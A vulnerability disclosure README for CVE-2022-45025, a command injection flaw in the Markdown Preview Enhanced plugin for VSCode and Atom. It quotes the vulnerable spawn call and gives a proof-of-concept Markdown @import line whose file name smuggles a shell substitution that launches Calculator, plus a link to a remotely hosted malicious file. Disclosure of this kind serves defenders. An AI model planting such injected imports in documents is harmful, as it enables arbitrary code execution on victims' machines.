# CVE-2022-45025
Command injection via PDF import in Markdown Preview Enhanced ([VSCode](https://marketplace.visualstudio.com/items?itemName=shd101wyy.markdown-preview-enhanced), [Atom](https://atom.io/packages/markdown-preview-enhanced))

## Description

The [Mume](https://github.com/shd101wyy/mume) markdown tool library was vulnerable to command injection due to use of `spawn` command with `{shell: true}` option. This could allow an attacker to achieve arbitary code execution by tricking victim into opening specially crafted Markdown file using VSCode or Atom. The library powers Markdown Preview Enhanced plugin for both [VSCode](https://github.com/shd101wyy/vscode-markdown-preview-enhanced) and [Atom](https://github.com/shd101wyy/markdown-preview-enhanced).


Vulnerable [code snippet](https://github.com/shd101wyy/mume/blob/7135d7606a6a57de6e2372c26a2f16bb98ecf2b2/src/pdf.ts):
```js
const task = spawn(
      "pdf2svg",
      [
        `"${pdfFilePath}"`,
        `"${path.resolve(svgDirectoryPath, svgFilePrefix + "%d.svg")}"`,
        "all",
      ],
      { shell: true },
    )
```

## Proof of Concept

The following Markdown document allows an attacker to execute arbitary command:

```md
@import "$(open -a Calculator > /dev/null | exit 0)hello.pdf"

The following comment will be recognised by MPE as valid "@import" command:

<!-- @import "$(open -a Calculator > /dev/null | exit 0)hello.pdf" -->
```

Alternatively, the payload could be executed from external source:
```md
<!-- @import "https://raw.githubusercontent.com/yuriisanin/CVE-2022-45025/main/examples/malicious.md" -->
```

**DEMO for both [VSCode](https://www.youtube.com/watch?v=bnK5DPdb5JU) and [Atom](https://www.youtube.com/watch?v=WxMVwkYrDzI) on YouTube.**

![vscode-rce-poc-gif](https://github.com/yuriisanin/CVE-2022-45025/blob/c60ece758e623176bc21461ef93604efa15d4e63/assets/mde-rce-short.gif)


## Support

You can follow me on [Twitter](https://twitter.com/SaninYurii), [GitHub](https://github.com/yuriisanin) or [YouTube](https://www.youtube.com/channel/UCLN2EvGxtnucEdrI21PmJZg).
